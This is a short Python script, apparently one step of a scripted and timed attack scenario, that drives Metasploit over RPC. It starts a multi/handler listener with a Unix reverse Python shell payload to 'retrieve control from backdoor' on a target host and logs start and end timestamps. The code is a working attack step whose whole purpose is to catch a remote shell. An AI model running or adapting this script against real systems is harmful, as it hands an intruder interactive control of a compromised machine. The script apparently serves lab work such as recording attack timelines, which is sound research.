import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')
    
    # start step 6
    output_time_file_start = 'time_step_6_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)
    
    # Retrieve control from backdoor
    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    payload['LHOST'] = my_ip

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    time.sleep(30)
    output_time_file_end = 'time_step_6_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)


main(sys.argv)
